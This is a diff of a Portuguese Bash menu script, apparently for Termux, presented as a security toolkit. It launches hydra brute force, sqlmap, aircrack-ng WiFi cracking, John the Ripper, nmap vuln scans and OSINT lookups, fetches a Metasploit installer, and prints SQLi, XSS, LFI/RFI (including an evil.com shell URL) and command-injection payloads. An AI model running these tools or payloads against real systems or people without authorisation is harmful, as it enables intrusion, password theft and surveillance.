@@ -7,12 +7,28 @@ BLUE='\033[0;34m'
 NC='\033[0m'
 
 install_dependencies() {
-    echo -e "${YELLOW}[*] Instalando dependências...${NC}"
-    pkg update -y && pkg upgrade -y
-    pkg install -y python3 python2 git wget curl nmap hydra ruby php openssh clang make
+    echo -e "${YELLOW}[*] Verificando dependências...${NC}"
+    pkgs=("python3" "wget" "curl" "nmap" "git" "ruby" "php" "openssh")
+    for pkg in "${pkgs[@]}"; do
+        if ! command -v "$pkg" &> /dev/null; then
+            echo -e "${BLUE}[+] Instalando $pkg...${NC}"
+            pkg install -y "$pkg" || {
+                echo -e "${RED}[!] Falha ao instalar $pkg${NC}"
+                exit 1
+            }
+        fi
+    done
     
-    pip3 install requests beautifulsoup4 scapy python-whois phonenumbers
-    gem install lolcat
+    pip_pkgs=("requests" "beautifulsoup4" "scapy" "python-whois")
+    for pip_pkg in "${pip_pkgs[@]}"; do
+        if ! python3 -c "import $pip_pkg" &> /dev/null; then
+            echo -e "${BLUE}[+] Instalando $pip_pkg via pip...${NC}"
+            pip install "$pip_pkg" || {
+                echo -e "${RED}[!] Falha ao instalar $pip_pkg${NC}"
+                exit 1
+            }
+        fi
+    done
 }
 
 main_menu() {
@@ -23,86 +39,78 @@ main_menu() {
     echo "  |  _||     | | | |  |  |__   |  | | |   __|"
     echo "  |_|  |__|__|_|_|_|_____|_____|  |_| |_____|"
     echo -e "${BLUE}"
-    echo "         FSociety Ultimate Toolkit v3.0"
+    echo "         FSociety Security Toolkit v3.1"
+    echo "      Advanced Security Assessment"
     echo -e "${NC}"
-    
-    echo -e "${YELLOW}1.${NC} Scanner de Redes e Vulnerabilidades"
-    echo -e "${YELLOW}2.${NC} Ferramentas de Ataque e Pentest"
-    echo -e "${YELLOW}3.${NC} OSINT e Investigação Digital"
-    echo -e "${YELLOW}4.${NC} Database de Falhas e Payloads"
+    echo -e "${YELLOW}1.${NC} Scanner de Vulnerabilidades"
+    echo -e "${YELLOW}2.${NC} Ferramentas de Ataque"
+    echo -e "${YELLOW}3.${NC} Ferramentas OSINT"
+    echo -e "${YELLOW}4.${NC} Database de Exploits"
     echo -e "${YELLOW}5.${NC} Ferramentas de Proteção"
     echo -e "${YELLOW}6.${NC} Instalar Todas as Ferramentas"
     echo -e "${YELLOW}7.${NC} Sair"
-    
-    read -p "Selecione: " choice
-    
+    echo -e ""
+    read -p "Selecione uma opção: " choice
+
     case $choice in
-        1) network_scanner ;;
+        1) vulnerability_scanner ;;
         2) attack_tools ;;
         3) osint_tools ;;
         4) exploits_db ;;
         5) protection_tools ;;
         6) install_all ;;
         7) exit 0 ;;
-        *) echo -e "${RED}[!] Inválido!${NC}"; sleep 1; main_menu ;;
+        *) echo -e "${RED}[!] Opção inválida!${NC}"; sleep 1; main_menu ;;
     esac
 }
 
-network_scanner() {
+vulnerability_scanner() {
     clear
     echo -e "${GREEN}"
-    echo "  ___ _   _ _____ _   _ _____ _____ _____ ___  _____ "
-    echo " | _ \ | | |_   _| | | |  ___|  ___|_   _/ _ \|  ___|"
-    echo " |  _/ |_| | | | | |_| | |__ | |__   | || | | | |__  "
-    echo " |_|  \___/  |_|  \___/|____||____|  |_||_| |_|____|"
+    echo "   ___ _____ _   _ _____ _____ _____ _____ _   _ _____ "
+    echo "  |_  |  _  | | | |  ___|  ___|  _  |_   _| | | |  ___|"
+    echo "    | | | | | | | | |__ | |__ | | | | | | | | | | |__  "
+    echo "    | | | | | | | |  __||  __|| | | | | | | | | |  __| "
+    echo "/\__/ \ \_/ / |_| | |___| |___\ \_/ /_| |_| |_| | |___ "
+    echo "\____/ \___/ \___/\____/\____/ \___/ \___/ \___/\____/ "
     echo -e "${NC}"
     
-    echo -e "${YELLOW}1.${NC} Nmap (Scanner Completo)"
-    echo -e "${YELLOW}2.${NC} Netcat (Conexões RAW)"
-    echo -e "${YELLOW}3.${NC} Wireshark (TShark CLI)"
-    echo -e "${YELLOW}4.${NC} Ping Sweep"
-    echo -e "${YELLOW}5.${NC} DNS Recon"
-    echo -e "${YELLOW}6.${NC} Voltar"
+    echo -e "${YELLOW}1.${NC} Scanner Básico de Portas"
+    echo -e "${YELLOW}2.${NC} Verificar Vulnerabilidades Web"
+    echo -e "${YELLOW}3.${NC} Scanner de Serviços Vulneráveis"
+    echo -e "${YELLOW}4.${NC} Verificar Headers de Segurança"
+    echo -e "${YELLOW}5.${NC} Voltar ao Menu Principal"
     
-    read -p "Selecione: " opt
+    read -p "Selecione uma opção: " vuln_choice
     
-    case $opt in
+    case $vuln_choice in
         1)
-            read -p "Alvo (IP/Domínio): " target
-            nmap -sS -sV -A -T4 $target | lolcat
+            read -p "Digite o IP ou domínio para scanear: " target
+            echo -e "${BLUE}[*] Iniciando scan de portas...${NC}"
+            nmap -sV "$target"
             ;;
         2)
-            read -p "Porta: " port
-            echo -e "${BLUE}Modo:${NC}"
-            echo "1) Ouvir porta"
-            echo "2) Conectar a porta"
-            read -p "Opção: " nc_opt
-            
-            case $nc_opt in
-                1) nc -lvp $port ;;
-                2) read -p "IP: " ip; nc $ip $port ;;
-                *) echo -e "${RED}[!] Inválido!${NC}" ;;
-            esac
+            read -p "Digite a URL do site (ex: http://exemplo.com): " url
+            echo -e "${BLUE}[*] Verificando vulnerabilidades web...${NC}"
+            curl -s -I "$url" | grep -i "server\|x-powered-by"
+            python3 -c "import requests; print('\nHeaders:', requests.get('$url').headers)"
             ;;
         3)
-            echo -e "${BLUE}Iniciando TShark...${NC}"
-            tshark -i wlan0
+            read -p "Digite o IP para verificar serviços vulneráveis: " ip
+            echo -e "${BLUE}[*] Procurando serviços vulneráveis...${NC}"
+            nmap --script vuln "$ip"
             ;;
         4)
-            read -p "Rede (ex: 192.168.1): " network
-            for ip in {1..254}; do
-                ping -c 1 $network.$ip | grep "bytes from" &
-            done
+            read -p "Digite a URL para verificar headers: " url
+            echo -e "${BLUE}[*] Analisando headers de segurança...${NC}"
+            curl -s -I "$url" | grep -i "strict-transport-security\|x-frame-options\|x-xss-protection\|x-content-type-options"
             ;;
-        5)
-            read -p "Domínio: " domain
-            dig ANY $domain
-            ;;
-        6) main_menu ;;
-        *) echo -e "${RED}[!] Inválido!${NC}"; network_scanner ;;
+        5) main_menu ;;
+        *) echo -e "${RED}[!] Opção inválida!${NC}"; sleep 1; vulnerability_scanner ;;
     esac
     
-    read -p "Continuar..."; network_scanner
+    read -p "Pressione Enter para continuar..."
+    vulnerability_scanner
 }
 
 attack_tools() {
@@ -121,53 +129,65 @@ attack_tools() {
     echo -e "${YELLOW}3.${NC} SQLmap (SQL Injection)"
     echo -e "${YELLOW}4.${NC} Aircrack-ng (WiFi)"
     echo -e "${YELLOW}5.${NC} John the Ripper (Quebra Senhas)"
-    echo -e "${YELLOW}6.${NC} Voltar"
+    echo -e "${YELLOW}6.${NC} Voltar ao Menu Principal"
     
-    read -p "Selecione: " opt
+    read -p "Selecione uma opção: " attack_choice
     
-    case $opt in
+    case $attack_choice in
         1)
-            echo -e "${BLUE}Iniciando Metasploit...${NC}"
-            ./metasploit.sh
+            if [ -f "metasploit.sh" ]; then
+                echo -e "${BLUE}[*] Iniciando Metasploit...${NC}"
+                ./metasploit.sh
+            else
+                echo -e "${YELLOW}[*] Baixando Metasploit...${NC}"
+                wget https://github.com/gushmazuko/metasploit_in_termux/raw/master/metasploit.sh
+                chmod +x metasploit.sh
+                ./metasploit.sh
+            fi
             ;;
         2)
-            read -p "Alvo (IP): " target
+            read -p "Digite o IP alvo: " target
             read -p "Serviço (ssh/ftp/http): " service
-            read -p "Lista de usuários: " user_list
-            read -p "Lista de senhas: " pass_list
-            hydra -L $user_list -P $pass_list $target $service
+            read -p "Usuário ou lista de usuários: " user
+            read -p "Senha ou lista de senhas: " pass
+            echo -e "${BLUE}[*] Iniciando ataque de força bruta...${NC}"
+            hydra -l "$user" -p "$pass" "$target" "$service"
             ;;
         3)
-            read -p "URL vulnerável: " url
+            read -p "Digite a URL vulnerável: " url
+            echo -e "${BLUE}[*] Iniciando SQLmap...${NC}"
             sqlmap -u "$url" --risk=3 --level=5 --batch
             ;;
         4)
             echo -e "${BLUE}1. Capturar handshake"
             echo "2. Quebrar handshake"
-            read -p "Opção: " wifi_opt
+            read -p "Selecione uma opção: " wifi_choice
             
-            case $wifi_opt in
+            case $wifi_choice in
                 1)
+                    echo -e "${YELLOW}[*] Coloque sua interface em modo monitor...${NC}"
                     airmon-ng start wlan0
                     airodump-ng wlan0mon
                     ;;
                 2)
                     read -p "Arquivo .cap: " cap_file
                     read -p "Wordlist: " wordlist
-                    aircrack-ng $cap_file -w $wordlist
+                    aircrack-ng "$cap_file" -w "$wordlist"
                     ;;
-                *) echo -e "${RED}[!] Inválido!${NC}" ;;
+                *) echo -e "${RED}[!] Opção inválida!${NC}" ;;
             esac
             ;;
         5)
             read -p "Arquivo hash: " hash_file
-            john --format=raw-md5 $hash_file
+            echo -e "${BLUE}[*] Iniciando John the Ripper...${NC}"
+            john --format=raw-md5 "$hash_file"
             ;;
         6) main_menu ;;
-        *) echo -e "${RED}[!] Inválido!${NC}"; attack_tools ;;
+        *) echo -e "${RED}[!] Opção inválida!${NC}"; sleep 1; attack_tools ;;
     esac
     
-    read -p "Continuar..."; attack_tools
+    read -p "Pressione Enter para continuar..."
+    attack_tools
 }
 
 osint_tools() {
@@ -176,7 +196,7 @@ osint_tools() {
     echo "   ___  _____ _   _ _____ _____ _____ "
     echo "  / _ \|  _  | \ | |_   _|_   _|_   _|"
     echo " / /_\ \ | | |  \| | | |   | |   | |  "
-    echo " |  _  | | | | . \` | | |   | |   | |  "
+    echo " |  _  \ | | | . \` | | |   | |   | |  "
     echo " | | | \ \_/ / |\  |_| |_  | |  _| |_ "
     echo " \_| |_/\___/\_| \_/\___/  \_/  \___/ "
     echo -e "${NC}"
@@ -186,47 +206,61 @@ osint_tools() {
     echo -e "${YELLOW}3.${NC} Busca por Username (Sherlock)"
     echo -e "${YELLOW}4.${NC} Analisador de Metadados"
     echo -e "${YELLOW}5.${NC} Verificação de Domínio"
-    echo -e "${YELLOW}6.${NC} Voltar"
+    echo -e "${YELLOW}6.${NC} Voltar ao Menu Principal"
     
-    read -p "Selecione: " opt
+    read -p "Selecione uma opção: " osint_choice
     
-    case $opt in
+    case $osint_choice in
         1)
-            read -p "Email: " email
-            curl -s "https://haveibeenpwned.com/api/v3/breachedaccount/$email" | jq .
+            read -p "Digite o email: " email
+            echo -e "${BLUE}[*] Verificando vazamentos...${NC}"
+            curl -s "https://haveibeenpwned.com/api/v3/breachedaccount/$email" | python3 -m json.tool
             ;;
         2)
-            read -p "Número (com código país): " phone
+            read -p "Digite o número com código do país: " phone
+            echo -e "${BLUE}[*] Analisando número...${NC}"
             python3 -c "import phonenumbers; from phonenumbers import carrier, geocoder; num = phonenumbers.parse('$phone'); print('Operadora:', carrier.name_for_number(num, 'pt')); print('Região:', geocoder.description_for_number(num, 'pt')); print('Válido:', phonenumbers.is_valid_number(num))"
             ;;
         3)
-            read -p "Username: " username
-            python3 -c "import os; os.system('sherlock $username')"
+            read -p "Digite o username: " username
+            echo -e "${BLUE}[*] Buscando em redes sociais...${NC}"
+            if ! command -v sherlock &> /dev/null; then
+                echo -e "${YELLOW}[*] Instalando Sherlock...${NC}"
+                git clone https://github.com/sherlock-project/sherlock.git
+                cd sherlock && pip install -r requirements.txt
+                python3 sherlock.py "$username"
+                cd ..
+            else
+                sherlock "$username"
+            fi
             ;;
         4)
-            read -p "Arquivo: " file
-            exiftool $file
+            read -p "Digite o caminho do arquivo: " file
+            echo -e "${BLUE}[*] Extraindo metadados...${NC}"
+            exiftool "$file"
             ;;
         5)
-            read -p "Domínio: " domain
-            whois $domain
+            read -p "Digite o domínio: " domain
+            echo -e "${BLUE}[*] Coletando informações...${NC}"
+            whois "$domain"
             ;;
         6) main_menu ;;
-        *) echo -e "${RED}[!] Inválido!${NC}"; osint_tools ;;
+        *) echo -e "${RED}[!] Opção inválida!${NC}"; sleep 1; osint_tools ;;
     esac
     
-    read -p "Continuar..."; osint_tools
+    read -p "Pressione Enter para continuar..."
+    osint_tools
 }
 
 exploits_db() {
     clear
     echo -e "${RED}"
     echo "  _____ _____ _____ _   _ _____ __  __ _____ _    _ _____ "
-    echo " |  ___|  ___|_   _| | | |_   _|  \/  |_   _| |  | |  ___|"
-    echo " | |__ | |__   | | | |_| | | | | .  . | | | | |  | | |__  "
-    echo " |  __||  __|  | | |  _  | | | | |\/| | | | | |/\| |  __| "
-    echo " | |___| |___ _| |_| | | |_| |_| |  | |_| |_\  /\  / |___ "
-    echo " \____/\____/ \___/\_| |_/\___/ \_|  |_/\___/ \/  \/\____/ "
+    echo " |  _  |  _  |_   _| | | |  _  |  \/  |_   _| |  | |  _  |"
+    echo " | | | | | | | | | | |_| | | | | .  . | | | | |  | | | | |"
+    echo " | | | | | | | | | |  _  | | | | |\/| | | | | |/\| | | | |"
+    echo " | |/ /| |/ / _| |_| | | | |/ /| |  | |_| |_\  /\  / |/ / "
+    echo " |___/ |___/  \___/\_| |_/___/ \_|  |_/\___/ \/  \/|___/  "
     echo -e "${NC}"
     
     echo -e "${YELLOW}1.${NC} SQL Injection Payloads"
@@ -234,67 +268,50 @@ exploits_db() {
     echo -e "${YELLOW}3.${NC} LFI/RFI Payloads"
     echo -e "${YELLOW}4.${NC} Comandos Injection"
     echo -e "${YELLOW}5.${NC} Proteção Contra Falhas"
-    echo -e "${YELLOW}6.${NC} Voltar"
+    echo -e "${YELLOW}6.${NC} Voltar ao Menu Principal"
     
-    read -p "Selecione: " opt
+    read -p "Selecione uma opção: " exploit_choice
     
-    case $opt in
+    case $exploit_choice in
         1)
-            echo -e "${BLUE}SQLi Payloads:${NC}"
+            echo -e "${BLUE}[*] SQLi Payloads:${NC}"
             echo "' OR 1=1 --"
             echo "admin'--"
             echo "1' ORDER BY 1--"
             echo "1' UNION SELECT null,table_name FROM information_schema.tables--"
             ;;
         2)
-            echo -e "${BLUE}XSS Payloads:${NC}"
+            echo -e "${BLUE}[*] XSS Payloads:${NC}"
             echo "<script>alert(1)</script>"
             echo "<img src=x onerror=alert(1)>"
             echo "\";alert(1);//"
             ;;
         3)
-            echo -e "${BLUE}LFI/RFI Payloads:${NC}"
+            echo -e "${BLUE}[*] LFI/RFI Payloads:${NC}"
             echo "../../../../etc/passwd"
             echo "php://filter/convert.base64-encode/resource=index.php"
             echo "http://evil.com/shell.txt"
             ;;
         4)
-            echo -e "${BLUE}Command Injection:${NC}"
+            echo -e "${BLUE}[*] Command Injection:${NC}"
             echo ";id"
             echo "|ls -la"
             echo "`whoami`"
             ;;
         5)
-            echo -e "${GREEN}Proteções:${NC}"
+            echo -e "${GREEN}[*] Medidas de Proteção:${NC}"
             echo "1. Use Prepared Statements"
             echo "2. Validar/Sanitizar inputs"
             echo "3. WAF (ModSecurity)"
             echo "4. Headers de Segurança"
+            echo "5. Atualizações Regulares"
             ;;
         6) main_menu ;;
-        *) echo -e "${RED}[!] Inválido!${NC}"; exploits_db ;;
+        *) echo -e "${RED}[!] Opção inválida!${NC}"; sleep 1; exploits_db ;;
     esac
     
-    read -p "Continuar..."; exploits_db
-}
-
-install_all() {
-    echo -e "${YELLOW}[*] Instalando todas as ferramentas...${NC}"
-   
-    pkg install -y nmap hydra sqlmap aircrack-ng john
-    
-    pip3 install sherlock phonenumbers
-    wget https://github.com/sundowndev/phoneinfoga/releases/download/v2.0.8/phoneinfoga_$(uname -s)_$(uname -m).tar.gz
-    tar xvf phoneinfoga_*.tar.gz
-    mv phoneinfoga /data/data/com.termux/files/usr/bin/
-
-
-    wget https://github.com/gushmazuko/metasploit_in_termux/raw/master/metasploit.sh
-    chmod +x metasploit.sh
-    
-    echo -e "${GREEN}[+] Todas ferramentas instaladas!${NC}"
-    sleep 2
-    main_menu
+    read -p "Pressione Enter para continuar..."
+    exploits_db
 }
 
 protection_tools() {
@@ -311,37 +328,64 @@ protection_tools() {
     echo -e "${YELLOW}3.${NC} Analisar Vulnerabilidades Web"
     echo -e "${YELLOW}4.${NC} Gerar Senha Segura"
     echo -e "${YELLOW}5.${NC} Verificar Vazamentos de Email"
-    echo -e "${YELLOW}6.${NC} Voltar"
+    echo -e "${YELLOW}6.${NC} Voltar ao Menu Principal"
     
-    read -p "Selecione: " opt
+    read -p "Selecione uma opção: " protect_choice
     
-    case $opt in
+    case $protect_choice in
         1)
-            echo -e "${BLUE}Portas abertas locais:${NC}"
+            echo -e "${BLUE}[*] Portas abertas locais:${NC}"
             netstat -tuln
             ;;
         2)
-            read -p "URL: " url
-            curl -s -I $url | grep -i "strict-transport-security\|x-frame-options\|x-xss-protection\|x-content-type-options"
+            read -p "Digite a URL: " url
+            echo -e "${BLUE}[*] Verificando headers...${NC}"
+            curl -s -I "$url" | grep -i "strict-transport-security\|x-frame-options\|x-xss-protection\|x-content-type-options"
             ;;
         3)
-            read -p "URL: " url
-            nikto -h $url
+            read -p "Digite a URL: " url
+            echo -e "${BLUE}[*] Analisando vulnerabilidades...${NC}"
+            nikto -h "$url"
             ;;
         4)
-            echo -e "${BLUE}Senha gerada:${NC}"
+            echo -e "${BLUE}[*] Gerando senha segura:${NC}"
             openssl rand -base64 16
             ;;
         5)
-            read -p "Email: " email
-            curl -s "https://haveibeenpwned.com/api/v3/breachedaccount/$email" | jq .
+            read -p "Digite o email: " email
+            echo -e "${BLUE}[*] Verificando vazamentos...${NC}"
+            curl -s "https://haveibeenpwned.com/api/v3/breachedaccount/$email" | python3 -m json.tool
             ;;
         6) main_menu ;;
-        *) echo -e "${RED}[!] Inválido!${NC}"; protection_tools ;;
+        *) echo -e "${RED}[!] Opção inválida!${NC}"; sleep 1; protection_tools ;;
     esac
     
-    read -p "Continuar..."; protection_tools
+    read -p "Pressione Enter para continuar..."
+    protection_tools
 }
+
+install_all() {
+    echo -e "${YELLOW}[*] Instalando todas as ferramentas...${NC}"
+    
+    pkg install -y nmap hydra sqlmap aircrack-ng john
+    
+    pip3 install sherlock phonenumbers
+    wget https://github.com/sundowndev/phoneinfoga/releases/download/v2.0.8/phoneinfoga_$(uname -s)_$(uname -m).tar.gz
+    tar xvf phoneinfoga_*.tar.gz
+    mv phoneinfoga /data/data/com.termux/files/usr/bin/
+    
+    wget https://github.com/gushmazuko/metasploit_in_termux/raw/master/metasploit.sh
+    chmod +x metasploit.sh
+    
+    echo -e "${GREEN}[+] Todas as ferramentas foram instaladas!${NC}"
+    sleep 2
+    main_menu
+}
+
+if [ "$(id -u)" -eq 0 ]; then
+    echo -e "${RED}[!] Não execute como root!${NC}"
+    exit 1
+fi
 
 install_dependencies
 main_menu
